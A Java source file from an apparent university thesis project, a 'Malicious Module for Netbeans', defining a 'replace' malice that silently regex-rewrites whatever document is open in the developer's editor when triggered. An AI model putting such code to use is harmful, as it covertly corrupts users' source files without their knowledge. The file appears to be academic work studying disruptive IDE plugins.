/*
 * Gdańsk University of Technology - Engineering Thesis
 * Malicious Module for Netbeans
 *
 * Cilińdź Michał, Gabryelska Nela, Micał Marek
 */
package pl.gda.pg.eti.kio.malicious.entity;

import java.awt.EventQueue;
import javax.swing.JEditorPane;
import javax.swing.text.AttributeSet;
import javax.swing.text.BadLocationException;
import javax.swing.text.StyledDocument;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.openide.cookies.EditorCookie;
import org.openide.nodes.Node;
import org.openide.windows.TopComponent;
import pl.gda.pg.eti.kio.malicious.annotation.CreatableMalicious;
import pl.gda.pg.eti.kio.malicious.attribute.TimeAttribute;
import pl.gda.pg.eti.kio.malicious.event.MaliciousEvent;

/**
 *
 * @author Marek Micał
 */
@CreatableMalicious(name = "replace")
public class Replace extends BaseMalice {

    private final Logger log = LogManager.getLogger(Replace.class);
    private String name = getClass().getSimpleName();
    
    private String from = "" ;
    private String to = "" ;

    @Override
    protected void execute(MaliciousEvent event) {

        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    Node[] n = TopComponent.getRegistry().getActivatedNodes();

                    if (n.length == 1) {
                        EditorCookie ec = (EditorCookie) n[0].getLookup().lookup(EditorCookie.class);
                        if (ec != null) {
                            JEditorPane[] panes = ec.getOpenedPanes();
                            if (panes != null && panes.length > 0) {

                                StyledDocument doc = (StyledDocument) panes[0].getDocument();
                                int deletedSemicolons = 0;
                                //Usuwanie średników w otwartym dokumencie
                                try {
                                    String textReplaced = doc.getText(0, doc.getLength()).replaceAll(from, to);
                                    System.out.println(textReplaced);
                                    doc.remove(0, doc.getLength());
                                    doc.insertString(0, textReplaced, null);
                                    log.info("Completed: {} - {}", name, "Replace completed successfully");

                                } catch (BadLocationException ex) {
                                    if (deletedSemicolons == 0) {
                                        log.error("Replace completed unsuccessfully", ex);
                                    } else {
                                        log.error("Replace completed partially. Semicolons deleted: " + deletedSemicolons, ex);
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception ex) {
                    log.error("Replace completed unsuccessfully", ex);
                }
            }
        });

    
    }
    
    
    public void setAttributes(String from, String to) {
            this.from = from;
            this.to = to;
    }
}
